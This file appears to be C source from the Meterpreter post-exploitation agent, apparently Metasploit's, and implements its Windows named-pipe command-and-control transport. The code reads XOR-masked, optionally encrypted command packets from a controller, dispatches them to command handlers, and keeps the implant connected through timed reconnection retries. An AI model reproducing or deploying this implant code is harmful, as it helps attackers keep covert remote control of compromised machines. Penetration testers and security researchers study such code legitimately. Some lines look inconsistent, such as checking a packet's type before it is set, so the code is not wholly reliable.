/*!
 * @file server_transport_named_pipe.c
 */
#include "metsrv.h"
#include "../../common/common.h"

/*!
 * @brief Poll a named pipe for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out (in milliseconds).
 * @return Indication of success or failure.
 */
static BOOL server_socket_poll(Remote* remote, long timeout)
{
	DWORD result = FALSE;
	DWORD bytesAvailable = 0;
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	dprintf("[DISPATH] testing for data on the pipe");
	if (PeekNamedPipe(ctx->pipe, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0)
	{
		dprintf("[DISPATH] pipe data found %u bytes", bytesAvailable);
		result = TRUE;
	}
	else
	{
		// simulate a wait so that we don't bash the crap out of the CPU?
		dprintf("[DISPATH] pipe data not found, sleeping");
		Sleep(timeout);
	}

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Receive a new packet on the given remote endpoint.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_receive_named_pipe(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	PacketHeader header;
	LONG bytesRead;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;

	lock_acquire(remote->lock);

	do
	{
		// Read the packet length
		while (headerBytes != sizeof(PacketHeader))
		{
			if (!ReadFile(ctx->pipe, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, &bytesRead, NULL))
			{
				break;
			}

			if (!bytesRead)
			{
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			headerBytes += bytesRead;
		}

		header.xor_key = ntohl(header.xor_key);

		// xor the header data
		xor_bytes(header.xor_key, (LPBYTE)&header.length, 8);

		// Initialize the header
		header.length = ntohl(header.length);

		// use TlvHeader size here, because the length doesn't include the xor byte
		payloadLength = header.length - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)calloc(1, payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		while (payloadBytesLeft > 0)
		{
			if (!ReadFile(ctx->pipe, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead, NULL))
			{
				break;
			}

			if (!bytesRead)
			{
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		xor_bytes(header.xor_key, payload, payloadLength);

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_named_pipe(Remote* remote, THREAD* dispatchThread)
{
	Transport* transport = remote->transport;
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	int lastPacket = current_unix_timestamp();
	while (running)
	{
		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_socket_poll(remote, 50000);
		if (result > 0)
		{
			result = packet_receive_named_pipe(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));

			// packet received, reset the timer
			lastPacket = current_unix_timestamp();
		}
		else if (result == 0)
		{
			// check if the communication has timed out, or the session has expired, so we should terminate the session
			int now = current_unix_timestamp();
			if (now > remote->sess_expiry_end)
			{
				result = ERROR_SUCCESS;
				dprintf("[DISPATCH] session has ended");
				break;
			}
			else if ((now - lastPacket) > transport->timeouts.comms)
			{
				result = ERROR_NETWORK_NOT_AVAILABLE;
				dprintf("[DISPATCH] communications has timed out");
				break;
			}
		}
		else
		{
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*!
 * @brief Get the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static DWORD transport_get_socket_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
	{
		return (DWORD)((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Destroy the named pipe transport.
 * @param transport Pointer to the TCP transport to destroy.
 */
static void transport_destroy_named_pipe(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_PIPE)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
		SAFE_FREE(transport->url);
		if (transport->ctx)
		{
			SAFE_FREE(((NamedPipeTransportContext*)transport->ctx)->pipe_name);
		}
		SAFE_FREE(transport->ctx);
		SAFE_FREE(transport);
	}
}

/*!
 * @brief Reset the given named pipe connection.
 * @param transport Pointer to the named pipe transport to reset.
 * @param shuttingDown Indication that the Metsrv instance is terminating completely.
 */
static void transport_reset_named_pipe(Transport* transport, BOOL shuttingDown)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_PIPE)
	{
		NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)transport->ctx;
		dprintf("[NP] Resetting transport from 0x%x", ctx->pipe);

		if (ctx->pipe && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			CloseHandle(ctx->pipe);
		}

		ctx->pipe = NULL;
		dprintf("[NP] Transport 0x%p is now reset to 0x%x", transport, ctx->pipe);
	}
}

/*!
 * @brief Configure the named pipe connnection. If it doesn't exist, go ahead and estbalish it.
 * @param remote Pointer to the remote instance with the named pipe transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv.
 * @return Indication of success or failure.
 */
static BOOL configure_named_pipe_connection(Transport* transport)
{
	DWORD result = ERROR_SUCCESS;
	wchar_t tempUrl[512];
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)transport->ctx;

	// check if comms is already open via a staged payload
	if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
	{
		dprintf("[NP] Connection already running on %u", ctx->pipe);
	}
	else
	{
		if (ctx->pipe_name == NULL)
		{
			dprintf("[NP CONFIGURE] Url: %S", transport->url);
			wcscpy_s(tempUrl, 512, transport->url);
			dprintf("[NP CONFIGURE] Copied: %S", tempUrl);

			transport->comms_last_packet = current_unix_timestamp();

			dprintf("[NP CONFIGURE] Making sure it's a pipe ...");
			if (wcsncmp(tempUrl, L"pipe", 4) == 0)
			{
				dprintf("[NP CONFIGURE] Yup, it is, parsing");
				wchar_t* pServer = wcsstr(tempUrl, L"//") + 2;
				dprintf("[NP CONFIGURE] pServer is %p", pServer);
				dprintf("[NP CONFIGURE] pServer is %S", pServer);
				wchar_t* pName = wcschr(pServer, L'/') + 1;
				dprintf("[NP CONFIGURE] pName is %p", pName);
				dprintf("[NP CONFIGURE] pName is %S", pName);
				wchar_t* pSlash = wcschr(pName, L'/');
				dprintf("[NP CONFIGURE] pName is %p", pName);

				// Kill off a trailing slash if there is one
				if (pSlash != NULL)
				{
					*pSlash = '\0';
				}

				*(pName - 1) = '\0';

				dprintf("[NP CONFIGURE] Server: %S", pServer);
				dprintf("[NP CONFIGURE] Name: %S", pName);

				size_t requiredSize = wcslen(pServer) + wcslen(pName) + 9;
				ctx->pipe_name = (STRTYPE)calloc(requiredSize, sizeof(CHARTYPE));
				_snwprintf_s(ctx->pipe_name, requiredSize, requiredSize - 1, L"\\\\%s\\pipe\\%s", pServer, pName);
				dprintf("[NP CONFIGURE] Full pipe name: %S", ctx->pipe_name);
			}
		}

		dprintf("[NP CONFIGURE] pipe name is %p", ctx->pipe_name);

		if (ctx->pipe_name != NULL)
		{
			int start = current_unix_timestamp();

			do
			{
				dprintf("[NP CONFIGURE] pipe name is %S, attempting to create", ctx->pipe_name);
				ctx->pipe = CreateFileW(ctx->pipe_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
				if (ctx->pipe != INVALID_HANDLE_VALUE)
				{
					break;
				}

				ctx->pipe = NULL;
				result = GetLastError();
				dprintf("[NP CONFIGURE] failed to create pipe: %u 0x%x", result, result);

				dprintf("[NP CONFIGURE] Connection failed, sleeping for %u s", transport->timeouts.retry_wait);
				sleep(transport->timeouts.retry_wait);

			} while (((DWORD)current_unix_timestamp() - (DWORD)start) < transport->timeouts.retry_total);
		}
		else
		{
			dprintf("[NP] we might have had an invalid URL");
			result = ERROR_INVALID_PARAMETER;
		}
	}

	if (result != ERROR_SUCCESS)
	{
		dprintf("[SERVER] Something went wrong %u", result);
		return FALSE;
	}

	dprintf("[SERVER] Looking good, FORWARD!");

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->pipe, HANDLE_FLAG_INHERIT, 0);

	transport->comms_last_packet = current_unix_timestamp();

	return TRUE;
}

/*!
 * @brief Transmit a packet via named pipe _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
DWORD packet_transmit_named_pipe(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
{
	CryptoContext* crypto;
	Tlv requestId;
	DWORD res;
	NamedPipeTransportContext* ctx = (NamedPipeTransportContext*)remote->transport->ctx;

	dprintf("[TRANSMIT] Sending packet to the server");

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		dprintf("[PACKET] New xor key for sending");
		packet->header.xor_key = rand_xor_key();
		// before transmission, xor the whole lot, starting with the body
		xor_bytes(packet->header.xor_key, (LPBYTE)packet->payload, packet->payloadLength);
		// then the header
		xor_bytes(packet->header.xor_key, (LPBYTE)&packet->header.length, 8);
		// be sure to switch the xor header before writing
		packet->header.xor_key = htonl(packet->header.xor_key);

		DWORD totalWritten = 0;

		while (totalWritten != sizeof(packet->header))
		{
			DWORD written = 0;
			if (!WriteFile(ctx->pipe, &packet->header + totalWritten, sizeof(packet->header) - totalWritten, &written, NULL))
			{
				dprintf("[NP-PACKET] Unable to transmit the header. %u 0x%x", GetLastError(), GetLastError());
				break;
			}
			totalWritten += written;
		}

		totalWritten = 0;
		while (totalWritten != packet->payloadLength)
		{
			DWORD written = 0;
			if (!WriteFile(ctx->pipe, packet->payload + totalWritten, packet->payloadLength - totalWritten, &written, NULL))
			{
				dprintf("[NP-PACKET] Unable to transmit the packet. %u 0x%x", GetLastError(), GetLastError());
				break;
			}
			totalWritten += written;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

static DWORD transport_get_pipe_handle(Transport* transport)
{
	if (transport != NULL)
	{
		return (DWORD)((NamedPipeTransportContext*)transport->ctx)->pipe;
	}

	return 0;
}

/*!
 * @brief Create a configuration block from the given transport.
 * @param transport Transport data to create the configuration from.
 * @return config Pointer to the config block to write to.
 */
void transport_write_named_pipe_config(Transport* transport, MetsrvTransportNamedPipe* config)
{
	if (transport && config)
	{
		config->common.comms_timeout = transport->timeouts.comms;
		config->common.retry_total = transport->timeouts.retry_total;
		config->common.retry_wait = transport->timeouts.retry_wait;
		wcsncpy(config->common.url, transport->url, URL_SIZE);
	}
}

/*!
 * @brief Creates a new named pipe transport instance.
 * @param config The Named Pipe configuration block.
 * @return Pointer to the newly configured/created Named Pipe transport instance.
 */
Transport* transport_create_named_pipe(MetsrvTransportNamedPipe* config)
{
	Transport* transport = (Transport*)calloc(1, sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)calloc(1, sizeof(TcpTransportContext));

	dprintf("[TRANS NP] Creating tcp transport for url %S", config->common.url);

	transport->type = METERPRETER_TRANSPORT_PIPE;
	transport->timeouts.comms = config->common.comms_timeout;
	transport->timeouts.retry_total = config->common.retry_total;
	transport->timeouts.retry_wait = config->common.retry_wait;
	transport->url = _wcsdup(config->common.url);
	transport->packet_transmit = packet_transmit_named_pipe;
	transport->transport_init = configure_named_pipe_connection;
	transport->transport_destroy = transport_destroy_named_pipe;
	transport->transport_reset = transport_reset_named_pipe;
	transport->server_dispatch = server_dispatch_named_pipe;
	transport->get_handle = transport_get_pipe_handle;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();

	return transport;
}

